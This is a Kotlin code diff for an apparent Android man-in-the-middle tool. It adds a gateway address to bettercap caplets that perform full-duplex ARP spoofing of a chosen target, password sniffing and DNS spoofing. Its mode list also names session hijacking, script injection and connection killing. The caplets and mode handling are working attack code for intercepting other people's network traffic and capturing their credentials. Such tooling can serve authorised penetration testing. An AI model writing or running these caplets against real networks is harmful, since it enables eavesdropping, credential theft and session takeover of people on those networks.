@@ -54,6 +54,15 @@ class ExternalToolMitmBackend(
                 summary = resourceProvider.getString(R.string.mitm_interface_required)
             )
         }
+        val gatewayAddress = if (requiresGateway(request.mode)) {
+            validateIpv4(request.gatewayAddress)
+                ?: return MitmActionResult(
+                    success = false,
+                    summary = resourceProvider.getString(R.string.mitm_gateway_required, interfaceName)
+                )
+        } else {
+            ""
+        }
 
         val readiness = loadReadiness(
             ShellStatus(
@@ -97,6 +106,7 @@ class ExternalToolMitmBackend(
                         config = config,
                         interfaceName = interfaceName,
                         targetHost = targetHost,
+                        gatewayAddress = gatewayAddress,
                         artifactPath = artifactPath,
                         sessionDirectory = sessionDirectory,
                         logFile = mainLogFile,
@@ -111,6 +121,7 @@ class ExternalToolMitmBackend(
                         config = config,
                         interfaceName = interfaceName,
                         targetHost = targetHost,
+                        gatewayAddress = gatewayAddress,
                         artifactPath = artifactPath,
                         sessionDirectory = sessionDirectory,
                         pidList = pidList
@@ -124,6 +135,7 @@ class ExternalToolMitmBackend(
                         config = config,
                         interfaceName = interfaceName,
                         targetHost = targetHost,
+                        gatewayAddress = gatewayAddress,
                         dnsRules = request.payloadValue,
                         artifactPath = artifactPath,
                         sessionDirectory = sessionDirectory,
@@ -145,6 +157,7 @@ class ExternalToolMitmBackend(
                         config = config,
                         targetHost = targetHost,
                         interfaceName = interfaceName,
+                        gatewayAddress = gatewayAddress,
                         redirectPort = redirectPort,
                         sessionDirectory = sessionDirectory,
                         logFile = mainLogFile,
@@ -234,6 +247,7 @@ class ExternalToolMitmBackend(
         config: MitmToolchainConfig,
         interfaceName: String,
         targetHost: String,
+        gatewayAddress: String,
         artifactPath: String,
         sessionDirectory: File,
         logFile: File,
@@ -246,7 +260,7 @@ class ExternalToolMitmBackend(
             interfaceName = interfaceName,
             sessionDirectory = sessionDirectory,
             logFile = logFile,
-            capletContent = buildArpSpoofCaplet(targetHost)
+            capletContent = buildArpSpoofCaplet(targetHost, gatewayAddress)
         )
         bettercapPid?.let(pidList::add)
         val tcpdumpPid = startDetachedProcess(
@@ -265,6 +279,7 @@ class ExternalToolMitmBackend(
         config: MitmToolchainConfig,
         interfaceName: String,
         targetHost: String,
+        gatewayAddress: String,
         artifactPath: String,
         sessionDirectory: File,
         pidList: MutableList<Long>
@@ -276,7 +291,7 @@ class ExternalToolMitmBackend(
             interfaceName = interfaceName,
             sessionDirectory = sessionDirectory,
             logFile = File(artifactPath),
-            capletContent = buildPasswordSniffCaplet(targetHost)
+            capletContent = buildPasswordSniffCaplet(targetHost, gatewayAddress)
         )
         bettercapPid?.let(pidList::add)
         if (bettercapPid == null) {
@@ -288,6 +303,7 @@ class ExternalToolMitmBackend(
         config: MitmToolchainConfig,
         interfaceName: String,
         targetHost: String,
+        gatewayAddress: String,
         dnsRules: String,
         artifactPath: String,
         sessionDirectory: File,
@@ -305,7 +321,7 @@ class ExternalToolMitmBackend(
             interfaceName = interfaceName,
             sessionDirectory = sessionDirectory,
             logFile = logFile,
-            capletContent = buildDnsSpoofCaplet(targetHost, artifactPath)
+            capletContent = buildDnsSpoofCaplet(targetHost, gatewayAddress, artifactPath)
         )
         bettercapPid?.let(pidList::add)
         if (bettercapPid == null) {
@@ -318,6 +334,7 @@ class ExternalToolMitmBackend(
         config: MitmToolchainConfig,
         targetHost: String,
         interfaceName: String,
+        gatewayAddress: String,
         redirectPort: Int,
         sessionDirectory: File,
         logFile: File,
@@ -347,7 +364,7 @@ class ExternalToolMitmBackend(
             interfaceName = interfaceName,
             sessionDirectory = sessionDirectory,
             logFile = logFile,
-            capletContent = buildArpSpoofCaplet(targetHost)
+            capletContent = buildArpSpoofCaplet(targetHost, gatewayAddress)
         ) ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
         pidList += bettercapPid
         return artifactPath
@@ -519,9 +536,10 @@ sleep 31536000
 """.trimIndent()
     }
 
-    private fun buildArpSpoofCaplet(targetHost: String): String {
+    private fun buildArpSpoofCaplet(targetHost: String, gatewayAddress: String): String {
         return """
 set events.stream.output stdout
+set gateway.address $gatewayAddress
 set arp.spoof.fullduplex true
 set arp.spoof.targets $targetHost
 arp.spoof on
@@ -529,9 +547,10 @@ sleep 31536000
 """.trimIndent()
     }
 
-    private fun buildPasswordSniffCaplet(targetHost: String): String {
+    private fun buildPasswordSniffCaplet(targetHost: String, gatewayAddress: String): String {
         return """
 set events.stream.output stdout
+set gateway.address $gatewayAddress
 set arp.spoof.fullduplex true
 set arp.spoof.targets $targetHost
 arp.spoof on
@@ -543,9 +562,10 @@ sleep 31536000
 """.trimIndent()
     }
 
-    private fun buildDnsSpoofCaplet(targetHost: String, hostsFilePath: String): String {
+    private fun buildDnsSpoofCaplet(targetHost: String, gatewayAddress: String, hostsFilePath: String): String {
         return """
 set events.stream.output stdout
+set gateway.address $gatewayAddress
 set arp.spoof.fullduplex true
 set arp.spoof.targets $targetHost
 arp.spoof on
@@ -554,6 +574,21 @@ set dns.spoof.hosts ${hostsFilePath}
 dns.spoof on
 sleep 31536000
 """.trimIndent()
+    }
+
+    private fun requiresGateway(mode: MitmMode): Boolean {
+        return when (mode) {
+            MitmMode.CONNECTION_KILL -> false
+            MitmMode.SNIFFER,
+            MitmMode.PASSWORD_SNIFFER,
+            MitmMode.DNS_SPOOF,
+            MitmMode.REDIRECT,
+            MitmMode.IMAGE_REPLACE,
+            MitmMode.VIDEO_REPLACE,
+            MitmMode.SCRIPT_INJECTION,
+            MitmMode.CUSTOM_FILTER,
+            MitmMode.SESSION_HIJACK -> true
+        }
     }
 
     private fun buildTcpdumpScript(
